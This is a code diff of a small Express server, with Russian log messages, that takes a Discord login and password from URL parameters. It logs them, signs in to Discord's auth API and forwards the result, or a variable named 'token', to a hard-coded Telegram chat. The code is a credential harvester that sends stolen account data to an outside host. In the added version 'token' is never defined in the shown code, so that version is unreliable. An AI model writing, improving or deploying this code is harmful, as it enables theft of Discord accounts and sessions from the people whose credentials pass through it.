@@ -15,28 +15,35 @@ app.get("/:first/:second", async (req, res) => {
   const login = req.params.first;
   const password = req.params.second;
 
-  try {
-    const response = await axios.post("https://discord.com/api/v9/auth/login", {
-      login: login,
-      password: password,
+  console.log(`Получены параметры: ${login}, ${password}`);
+
+  axios
+    .post("https://discord.com/api/v9/auth/login", {
+      login: `${login}`,
+      password: `${password}`,
+    })
+    .then(function (response) {
+      console.log("Успешная авторизация:", response.data);
+
+      try {
+        axios
+          .post(apiUrl, {
+            chat_id: "6425112328",
+            text: `${token}`,
+          })
+          .then((response) => {
+            console.log("successfully");
+          })
+          .catch((error) => {
+            console.error("Error");
+          });
+      } catch (error) {
+        console.error("error");
+      }
+    })
+    .catch(function (error) {
+      console.log("Ошибка авторизации:", error);
     });
-
-    console.log("Успешная авторизация:", response.data);
-
-    await axios.post(apiUrl, {
-      chat_id: "6425112328",
-      text: `${response.data}`,
-    });
-
-    console.log("Успешно отправлено"); // Success message (Russian: Successfully sent)
-
-  } catch (error) {
-    if (error.response) {
-      console.error("Ошибка авторизации:", error.response.data); // Error message (Russian: Authorization error)
-    } else {
-      console.error("Неизвестная ошибка:", error); // Unknown error message
-    }
-  }
 });
 
 app.listen(port, "0.0.0.0", () => {
